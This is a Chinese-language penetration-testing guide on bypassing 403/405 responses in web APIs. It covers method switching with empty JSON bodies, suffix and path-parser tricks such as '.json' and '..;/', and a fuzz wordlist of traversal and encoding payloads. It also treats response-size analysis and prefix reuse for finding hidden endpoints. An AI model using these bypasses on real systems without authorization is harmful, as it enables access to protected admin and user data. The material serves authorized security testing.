# 403/405 接口绕过模式

当接口返回 403（Forbidden）或 405（Method Not Allowed）时，不要直接跳过——这恰恰说明接口存在且有功能，只是访问控制可能有缺陷。以下技巧源自实战 SRC 案例。

---

## 405 → POST + 空 JSON 体

接口返回 405 Method Not Allowed 时，通常说明 GET 不被允许但其他方法可能可以。关键是不能只改方法——还要带上正确的 Content-Type 和空 JSON body，否则后端可能因格式错误而不返回有效数据：

```bash
# 原始 GET 返回 405
curl -s http://target/api/user/info
# → 405 Method Not Allowed

# 改 POST + 空 JSON（关键是 Content-Type + 空体一起带）
curl -s -X POST http://target/api/user/info \
  -H "Content-Type: application/json" \
  -d '{}'
# → 200 + 返回参数缺失提示（告诉你需要什么参数）

# 根据提示补全参数
curl -s -X POST http://target/api/user/info \
  -H "Content-Type: application/json" \
  -d '{"userId": 1}'
# → 200 + 用户信息
```

为什么有效：很多框架（Spring MVC、Express）对 GET 和 POST 走不同的过滤链，GET 可能被全局 403 规则拦截，但 POST 路径没有对应的拦截规则。

---

## 403 → 资源后缀绕过

利用 Web 服务器/框架对 URL 路径的解析差异。Nginx/Apache 代理层可能根据后缀判断是否为静态资源，对 `.json`、`.css` 等后缀放行而不经过鉴权中间件：

```bash
# 原始接口返回 403
curl -s http://target/api/admin/users
# → 403 Forbidden

# 添加资源文件后缀
curl -s http://target/api/admin/users.json    # 最常见的绕过
curl -s http://target/api/admin/users.css
curl -s http://target/api/admin/users.html
curl -s http://target/api/admin/users.js

# 添加特殊字符
curl -s "http://target/api/admin/users?"
curl -s "http://target/api/admin/users??"
curl -s "http://target/api/admin/users?a.css"
curl -s "http://target/api/admin/users#"
curl -s http://target/api/admin/users/.
curl -s http://target/api/admin/users/./
curl -s http://target/api/admin/users..;/
```

**测试策略**：不要在每个接口上逐一手动测——当发现一个 403 接口时，用下面的字典在**接口末尾**批量 fuzz：

### 403 绕过 Fuzz 字典

```
%09
%20
%23
%2e
%2f
/%2e/
//
/..;/
//..;/
/%20
/%09
/%00
/.json
/.css
/.html
/?
/??
/???
/?testparam
/#
/#test
//.
////
/.//./
~
.
;
..;
;%09
;%09..
;%09..;
;%2f..
*
.json
../
..;/
?a.css
?a.js
?a.jpg
?a.png
../admin
..%2f
./
.%2f
..%00/
..%0d/
..%5c
&
@
?
??
...\
.././
/;/
.%2e/
..\
..%ff/
%2e%2e%2f
%3f
?.css
?.js
%3f.css
%3f.js
%26
%0a
%0d
%0d%0a
%3b
\
.\
```

### 多位置 Fuzz

后缀不只能加在末尾——路径中的每一层目录都可能是绕过点：

```
原始: /api/admin/users
位置1: /api/admin/users.json        ← 末尾
位置2: /api/admin/.json/users       ← 中间层
位置3: /api/.json/admin/users       ← 靠前位置
位置4: /api/admin/users/..;/users   ← 路径回溯
```

### 辅助工具

- **BypassPro** (https://github.com/0x727/BypassPro) — Burp 插件，cli 用不了，自动对 403 接口进行多位置、多后缀 fuzz
- **403bypasser** — 命令行工具，批量测试

---

## 响应字节分析

绕过尝试后，不能只看状态码——更重要的是**响应字节长度**：

| 状态 | 字节变化 | 含义 |
|------|----------|------|
| 403 → 200 | 字节大幅增加 | ✅ 绕过成功，加载了新数据 |
| 403 → 200 | 字节很小（几十字节） | ⚠️ 可能只是空页面/默认页 |
| 200 → 200 | 字节从小变大 | ✅ 不同后缀加载了不同数据 |
| 任何状态 | 字节和正常页面一样 | 未绕过，只是返回了默认页 |

当字节明显变大时，说明加载了新的内容（可能是新的 JS 文件、新的 API 数据），这些新内容中可能包含更多可利用的接口和信息。

---

## Vue/SPA 框架 # Hash 路由

Vue 等前端框架使用 `#` 作为路由标记（如 `https://target/#/login/`）。`#` 后面的内容不会发送到服务器，所以代理工具抓不到前端路由请求。这意味着：

1. 通过 JS 分析（熊猫头/urlfind）找到的接口，前面可能需要加 API 前缀才能直接请求
2. 手动在浏览器中拼接有效接口（如 `https://target/#/admin/dashboard`），如果出现新页面，就会加载新的 JS，从中提取更多接口
3. 用 urlfind 或类似工具扫描时，关注**字节变化**——字节变大说明加载了新数据/新 JS

```bash
# Vue 应用的登录页
https://target/rental/#/login/

# 手动拼接管理接口
https://target/rental/#/admin/dashboard
https://target/rental/#/riskReport?transId=

# 实际 API 请求（需找到正确的前缀）
curl -s http://target/api/gw/rent/rebateBillSettlementList
```

---

## 前置路径发现

同一系统的 API 通常共享相同的前置路径。当在流量中发现一个完整的 API 路径（如 `/api/gw/rent/rebateBillSettlementList`），把这个前置路径（`/api/gw/rent/`）提取出来，和从 JS 中找到的其他短接口名拼接：

```bash
# 流量中捕获到的完整路径
/api/gw/rent/rebateBillSettlementList

# JS 中找到的短接口名
userList
orderDetail
paymentRecord

# 拼接测试
curl -s http://target/api/gw/rent/userList
curl -s http://target/api/gw/rent/orderDetail
curl -s http://target/api/gw/rent/paymentRecord
```

跨站点时同理：如果 A 站和 B 站共用一套后端，A 站发现的接口前缀可以拿到 B 站去尝试。
